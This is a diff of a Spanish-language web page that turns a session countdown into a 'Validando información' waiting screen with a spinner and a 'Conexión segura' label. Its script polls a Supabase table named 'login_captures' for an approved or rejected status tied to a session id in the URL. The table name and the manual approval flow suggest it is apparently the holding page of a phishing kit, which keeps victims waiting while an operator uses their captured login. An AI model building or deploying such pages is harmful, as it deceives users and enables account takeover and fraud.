@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contador de cierre de sesión</title>
+    <title>Validando información</title>
     <style>
         * {
             margin: 0;
@@ -21,84 +21,118 @@
         .container {
             background: white;
             border-radius: 16px;
-            padding: 40px 50px;
+            padding: 50px 60px;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
             text-align: center;
-            max-width: 500px;
+            max-width: 420px;
             width: 90%;
         }
         .logo {
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
         .logo svg {
-            width: 80px;
-            height: 80px;
+            width: 72px;
+            height: 72px;
         }
+
+        /* Spinner */
+        .spinner {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 28px auto;
+            position: relative;
+        }
+        .spinner-ring {
+            box-sizing: border-box;
+            display: block;
+            position: absolute;
+            width: 60px;
+            height: 60px;
+            border: 5px solid #eff0f2;
+            border-radius: 50%;
+            border-top-color: #ff7800;
+            animation: spin 1s linear infinite;
+        }
+        .spinner-ring:nth-child(2) {
+            width: 44px;
+            height: 44px;
+            top: 8px;
+            left: 8px;
+            border-top-color: #002a8d;
+            animation-duration: 0.8s;
+            animation-direction: reverse;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
         h1 {
             color: #002a8d;
-            font-size: 1.5rem;
-            margin-bottom: 10px;
+            font-size: 1.4rem;
+            margin-bottom: 12px;
             font-weight: 600;
         }
         .message {
             color: #4d5b70;
             font-size: 1rem;
-            margin-bottom: 30px;
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+        .dots {
+            display: inline-flex;
+            gap: 4px;
+        }
+        .dots span {
+            width: 6px;
+            height: 6px;
+            background: #ff7800;
+            border-radius: 50%;
+            display: inline-block;
+            animation: bounce 1.4s ease-in-out infinite both;
+        }
+        .dots span:nth-child(1) { animation-delay: 0s; }
+        .dots span:nth-child(2) { animation-delay: 0.16s; }
+        .dots span:nth-child(3) { animation-delay: 0.32s; }
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); opacity: 0.4; }
+            40% { transform: scale(1); opacity: 1; }
+        }
+
+        .footer-text {
+            margin-top: 30px;
+            color: #868f9e;
+            font-size: 0.8rem;
+        }
+        .footer-text .lock-icon {
+            display: inline-block;
+            margin-right: 4px;
+            vertical-align: middle;
+        }
+
+        /* Estados de resultado */
+        .result-container {
+            display: none;
+        }
+        .result-container.active {
+            display: block;
+        }
+        .result-container .icon-result {
+            font-size: 64px;
+            margin-bottom: 16px;
+        }
+        .result-container h2 {
+            font-size: 1.3rem;
+            margin-bottom: 8px;
+        }
+        .result-container p {
+            color: #4d5b70;
+            font-size: 0.95rem;
             line-height: 1.5;
         }
-        .timer {
-            font-size: 4rem;
-            font-weight: 700;
-            color: #ff7800;
-            margin: 20px 0;
-            font-variant-numeric: tabular-nums;
-        }
-        .timer-label {
-            color: #868f9e;
-            font-size: 0.9rem;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 30px;
-        }
-        .progress-bar {
-            width: 100%;
-            height: 6px;
-            background: #eff0f2;
-            border-radius: 3px;
-            overflow: hidden;
-            margin-bottom: 30px;
-        }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #ff7800, #ff961f);
-            border-radius: 3px;
-            transition: width 1s linear;
-            width: 100%;
-        }
-        .btn {
-            background: #ff7800;
-            color: white;
-            border: none;
-            padding: 12px 40px;
-            border-radius: 25px;
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        .btn:hover {
-            background: #ff961f;
-        }
-        .btn:disabled {
-            background: #bfc4cc;
-            cursor: not-allowed;
-        }
-        .expired {
-            color: #e30425;
-            font-weight: 600;
-            font-size: 1.2rem;
-            margin-top: 20px;
-        }
+        .result-approved h2 { color: #37a500; }
+        .result-rejected h2 { color: #e30425; }
+        .result-error h2 { color: #ff7800; }
     </style>
 </head>
 <body>
@@ -110,72 +144,167 @@
                 <path d="M30 40 L40 30 L50 40" stroke="#002a8d" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
             </svg>
         </div>
-        <h1>Sesión temporal</h1>
-        <p class="message" id="mensaje">Esta ventana se cerrará en <strong id="contadorTexto">279</strong> segundos</p>
-        <div class="timer" id="timerDisplay">04:39</div>
-        <div class="timer-label">Tiempo restante</div>
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill"></div>
+
+        <!-- Spinner de carga -->
+        <div id="loadingSection">
+            <div class="spinner">
+                <div class="spinner-ring"></div>
+                <div class="spinner-ring"></div>
+            </div>
+            <h1>Validando información</h1>
+            <p class="message">
+                Estamos verificando tus datos<br>
+                para iniciar tu sesión
+                <span class="dots">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </span>
+            </p>
         </div>
-        <button class="btn" id="btnReiniciar" onclick="reiniciarContador()">Reiniciar contador</button>
-        <div id="expiredMessage" class="expired" style="display: none;">⏰ La sesión ha expirado</div>
+
+        <!-- Resultado: Aprobado -->
+        <div id="resultApproved" class="result-container result-approved">
+            <div class="icon-result">✅</div>
+            <h2>Sesión Aprobada</h2>
+            <p>Tu inicio de sesión ha sido verificado y aprobado correctamente.</p>
+        </div>
+
+        <!-- Resultado: Rechazado -->
+        <div id="resultRejected" class="result-container result-rejected">
+            <div class="icon-result">❌</div>
+            <h2>Sesión Rechazada</h2>
+            <p>Lo sentimos, tu inicio de sesión no pudo ser verificado. Intenta nuevamente.</p>
+        </div>
+
+        <!-- Resultado: Error -->
+        <div id="resultError" class="result-container result-error">
+            <div class="icon-result">⚠️</div>
+            <h2>Error de conexión</h2>
+            <p>No se pudo verificar el estado de tu sesión. Por favor, intenta de nuevo más tarde.</p>
+        </div>
+
+        <p class="footer-text">
+            <span class="lock-icon">🔒</span> Conexión segura
+        </p>
     </div>
 
     <script>
-        let tiempoRestante = 279; // segundos
-        const totalInicial = 279;
-        let intervalo = null;
+        // ═══════════════════════════════════════════════════════════════
+        // CONFIGURACIÓN SUPABASE
+        // ═══════════════════════════════════════════════════════════════
+        const SUPABASE_URL = 'https://ktuknakuiicqdicknqnu.supabase.co';
+        const SUPABASE_ANON_KEY = 'sb_publishable_mIQcyGnaX_oatdbodvzJVQ_Szu_D0en';
 
-        function formatearTiempo(segundos) {
-            const mins = Math.floor(segundos / 60);
-            const secs = segundos % 60;
-            return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        // ═══════════════════════════════════════════════════════════════
+        // OBTENER ID DE LA SESIÓN DESDE LA URL
+        // ═══════════════════════════════════════════════════════════════
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('id');
+
+        // ═══════════════════════════════════════════════════════════════
+        // MOSTRAR RESULTADO
+        // ═══════════════════════════════════════════════════════════════
+        function mostrarResultado(tipo) {
+            document.getElementById('loadingSection').style.display = 'none';
+            document.getElementById('resultApproved').classList.remove('active');
+            document.getElementById('resultRejected').classList.remove('active');
+            document.getElementById('resultError').classList.remove('active');
+
+            if (tipo === 'approved') {
+                document.getElementById('resultApproved').classList.add('active');
+            } else if (tipo === 'rejected') {
+                document.getElementById('resultRejected').classList.add('active');
+            } else {
+                document.getElementById('resultError').classList.add('active');
+            }
         }
 
-        function actualizarContador() {
-            // Actualizar elementos del DOM
-            document.getElementById('contadorTexto').textContent = tiempoRestante;
-            document.getElementById('mensaje').innerHTML = `Esta ventana se cerrará en <strong>${tiempoRestante}</strong> segundos`;
-            document.getElementById('timerDisplay').textContent = formatearTiempo(tiempoRestante);
-            
-            // Actualizar barra de progreso
-            const porcentaje = (tiempoRestante / totalInicial) * 100;
-            document.getElementById('progressFill').style.width = porcentaje + '%';
-
-            // Si llega a 0, detener
-            if (tiempoRestante <= 0) {
-                clearInterval(intervalo);
-                intervalo = null;
-                document.getElementById('timerDisplay').textContent = '00:00';
-                document.getElementById('contadorTexto').textContent = '0';
-                document.getElementById('mensaje').innerHTML = 'Esta ventana se cerrará en <strong>0</strong> segundos';
-                document.getElementById('progressFill').style.width = '0%';
-                document.getElementById('expiredMessage').style.display = 'block';
-                document.getElementById('btnReiniciar').disabled = false;
+        // ═══════════════════════════════════════════════════════════════
+        // CONSULTAR ESTADO DE LA SESIÓN
+        // ═══════════════════════════════════════════════════════════════
+        async function consultarEstado() {
+            if (!sessionId) {
+                console.error('No se encontró ID de sesión en la URL');
+                mostrarResultado('error');
                 return;
             }
 
-            tiempoRestante--;
-        }
+            try {
+                const response = await fetch(`${SUPABASE_URL}/rest/v1/login_captures?id=eq.${sessionId}&select=status`, {
+                    headers: {
+                        'apikey': SUPABASE_ANON_KEY,
+                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+                        'Content-Type': 'application/json'
+                    }
+                });
 
-        function iniciarContador() {
-            if (intervalo) {
-                clearInterval(intervalo);
+                if (response.status === 404) {
+                    // La tabla no existe en Supabase
+                    console.error('La tabla login_captures no existe en Supabase');
+                    mostrarResultado('error');
+                    return true;
+                }
+
+                if (!response.ok) {
+                    // Si es 400, probablemente el ID no existe aún (se creará pronto)
+                    if (response.status === 400 || response.status === 406) {
+                        console.log('Sesión aún no disponible, reintentando...');
+                        return false; // Continuar polling
+                    }
+                    throw new Error(`Error HTTP: ${response.status}`);
+                }
+
+                const data = await response.json();
+
+                if (!data || data.length === 0) {
+                    console.log('Sesión no encontrada aún, reintentando...');
+                    return false; // Continuar polling en lugar de mostrar error
+                }
+
+                const estado = data[0].status || 'pendiente';
+
+                if (estado === 'approved') {
+                    mostrarResultado('approved');
+                    return true;
+                } else if (estado === 'rejected') {
+                    mostrarResultado('rejected');
+                    return true;
+                } else {
+                    // Sigue pendiente, continuar consultando
+                    return false;
+                }
+
+            } catch (error) {
+                console.error('Error al consultar estado:', error);
+                mostrarResultado('error');
+                return true; // Detener el polling si hay error
             }
-            intervalo = setInterval(actualizarContador, 1000);
         }
 
-        function reiniciarContador() {
-            tiempoRestante = 279;
-            document.getElementById('expiredMessage').style.display = 'none';
-            document.getElementById('btnReiniciar').disabled = true;
-            actualizarContador();
-            iniciarContador();
-        }
+        // ═══════════════════════════════════════════════════════════════
+        // INICIAR POLLING EN TIEMPO REAL
+        // ═══════════════════════════════════════════════════════════════
+        document.addEventListener('DOMContentLoaded', function() {
+            if (!sessionId) {
+                mostrarResultado('error');
+                return;
+            }
 
-        // Iniciar el contador al cargar la página
-        actualizarContador();
-        iniciarContador();
+            // Consultar inmediatamente
+            consultarEstado().then(function(finalizado) {
+                if (!finalizado) {
+                    // Si sigue pendiente, consultar cada 2 segundos
+                    var intervalo = setInterval(function() {
+                        consultarEstado().then(function(finalizado) {
+                            if (finalizado) {
+                                clearInterval(intervalo);
+                            }
+                        });
+                    }, 2000);
+                }
+            });
+        });
     </script>
 </body>
 </html>
